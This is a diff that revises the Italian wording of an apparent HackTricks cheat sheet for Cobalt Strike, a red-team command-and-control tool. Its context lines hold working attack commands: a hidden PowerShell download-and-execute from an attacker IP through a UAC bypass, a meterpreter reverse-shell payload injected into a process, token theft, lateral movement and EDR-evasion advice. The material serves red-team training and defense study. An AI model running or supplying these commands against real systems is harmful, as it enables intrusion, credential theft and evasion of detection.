@@ -1,5 +1,7 @@
 # Cobalt Strike
 
+{{#include /banners/hacktricks-training.md}}
+
 ### Listeners
 
 ### C2 Listeners
@@ -41,9 +43,9 @@ execute-assembly </path/to/executable.exe>
 # Nota che per caricare assembly più grandi di 1MB, la proprietà 'tasks_max_size' del profilo malleable deve essere modificata.
 
 # Screenshots
-printscreen    # Fai uno screenshot singolo tramite il metodo PrintScr
-screenshot     # Fai uno screenshot singolo
-screenwatch    # Fai screenshot periodici del desktop
+printscreen    # Scatta un singolo screenshot tramite il metodo PrintScr
+screenshot     # Scatta un singolo screenshot
+screenwatch    # Scatta screenshot periodici del desktop
 ## Vai su View -> Screenshots per vederli
 
 # keylogger
@@ -77,7 +79,7 @@ elevate uac-token-duplication <listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
 ## Ruba token da pid
-## Come make_token ma rubando il token da un processo
+## Come make_token ma ruba il token da un processo
 steal_token [pid] # Inoltre, questo è utile per azioni di rete, non azioni locali
 ## Dalla documentazione API sappiamo che questo tipo di accesso "consente al chiamante di clonare il proprio token attuale". Questo è il motivo per cui l'output del Beacon dice Impersonated <current_username> - sta impersonando il nostro token clonato.
 ls \\computer_name\c$ # Prova a usare il token generato per accedere a C$ in un computer
@@ -135,7 +137,7 @@ jump [method] [target] [listener]
 ## Metodi:
 ## psexec                    x86   Usa un servizio per eseguire un artefatto Service EXE
 ## psexec64                  x64   Usa un servizio per eseguire un artefatto Service EXE
-## psexec_psh                x86   Usa un servizio per eseguire una riga di comando PowerShell
+## psexec_psh                x86   Usa un servizio per eseguire un one-liner PowerShell
 ## winrm                     x86   Esegui uno script PowerShell tramite WinRM
 ## winrm64                   x64   Esegui uno script PowerShell tramite WinRM
 ## wmi_msbuild               x64   movimento laterale wmi con attività inline c# msbuild (oppsec)
@@ -162,14 +164,14 @@ msf6 exploit(multi/handler) > exploit -j
 
 ## Su cobalt: Listeners > Aggiungi e imposta il Payload su Foreign HTTP. Imposta l'Host su 10.10.5.120, la Porta su 8080 e fai clic su Salva.
 beacon> spawn metasploit
-## Puoi solo avviare sessioni Meterpreter x86 con il listener estero.
+## Puoi solo generare sessioni Meterpreter x86 con il listener estero.
 
 # Pass session to Metasploit - Through shellcode injection
 ## Sul host metasploit
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
 ## Esegui msfvenom e prepara il listener multi/handler
 
-## Copia il file bin su host cobalt strike
+## Copia il file bin sul host cobalt strike
 ps
 shinject <pid> x64 C:\Payloads\msf.bin #Inietta shellcode metasploit in un processo x64
 
@@ -202,10 +204,10 @@ Lo script aggressore `https://github.com/outflanknl/HelpColor` creerà il comand
 
 Puoi controllare eventi come `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:
 
-- Security EID 4624 - Controlla tutti i logon interattivi per conoscere le ore di lavoro abituali.
-- System EID 12,13 - Controlla la frequenza di spegnimento/accensione/ibernazione.
+- Security EID 4624 - Controlla tutti i logon interattivi per conoscere le abituali ore di lavoro.
+- System EID 12,13 - Controlla la frequenza di spegnimento/accensione/sospensione.
 - Security EID 4624/4625 - Controlla i tentativi NTLM validi/invalidi in entrata.
-- Security EID 4648 - Questo evento viene creato quando vengono utilizzate credenziali in chiaro per accedere. Se un processo lo ha generato, il binario potrebbe avere le credenziali in chiaro in un file di configurazione o all'interno del codice.
+- Security EID 4648 - Questo evento viene creato quando vengono utilizzate credenziali in chiaro per effettuare l'accesso. Se un processo lo ha generato, il binario potrebbe avere le credenziali in chiaro in un file di configurazione o all'interno del codice.
 
 Quando usi `jump` da cobalt strike, è meglio usare il metodo `wmi_msbuild` per far sembrare il nuovo processo più legittimo.
 
@@ -221,7 +223,7 @@ I payload stageless sono meno rumorosi rispetto a quelli staged perché non hann
 
 Fai attenzione quando rubi o generi token perché potrebbe essere possibile per un EDR enumerare tutti i token di tutti i thread e trovare un **token appartenente a un utente diverso** o persino a SYSTEM nel processo.
 
-Questo consente di memorizzare i token **per beacon** in modo che non sia necessario rubare lo stesso token più e più volte. Questo è utile per il movimento laterale o quando hai bisogno di utilizzare un token rubato più volte:
+Questo consente di memorizzare i token **per beacon** in modo che non sia necessario rubare lo stesso token ripetutamente. Questo è utile per il movimento laterale o quando hai bisogno di utilizzare un token rubato più volte:
 
 - token-store steal <pid>
 - token-store steal-and-use <pid>
@@ -272,13 +274,13 @@ Quando si inietta codice in un processo, questo è solitamente molto rumoroso, q
 
 Quando si genera un nuovo processo è importante **mantenere una regolare relazione genitore-figlio** tra i processi per evitare il rilevamento. Se svchost.exec sta eseguendo iexplorer.exe sembrerà sospetto, poiché svchost.exe non è un genitore di iexplorer.exe in un normale ambiente Windows.
 
-Quando un nuovo beacon viene generato in Cobalt Strike, per impostazione predefinita viene creato un processo utilizzando **`rundll32.exe`** per eseguire il nuovo listener. Questo non è molto furtivo e può essere facilmente rilevato dagli EDR. Inoltre, `rundll32.exe` viene eseguito senza argomenti rendendolo ancora più sospetto.
+Quando un nuovo beacon viene generato in Cobalt Strike, per impostazione predefinita viene creato un processo utilizzando **`rundll32.exe`** per eseguire il nuovo listener. Questo non è molto furtivo e può essere facilmente rilevato dagli EDR. Inoltre, `rundll32.exe` viene eseguito senza argomenti, rendendolo ancora più sospetto.
 
 Con il seguente comando Cobalt Strike, puoi specificare un processo diverso per generare il nuovo beacon, rendendolo meno rilevabile:
 ```bash
 spawnto x86 svchost.exe
 ```
-Puoi anche cambiare questa impostazione **`spawnto_x86` e `spawnto_x64`** in un profilo.
+Puoi anche modificare questa impostazione **`spawnto_x86` e `spawnto_x64`** in un profilo.
 
 ### Proxying attackers traffic
 
@@ -360,3 +362,6 @@ cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\Resou
 cd  C:\Tools\cobaltstrike\ArtifactKit  
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
+
+
+{{#include /banners/hacktricks-training.md}}
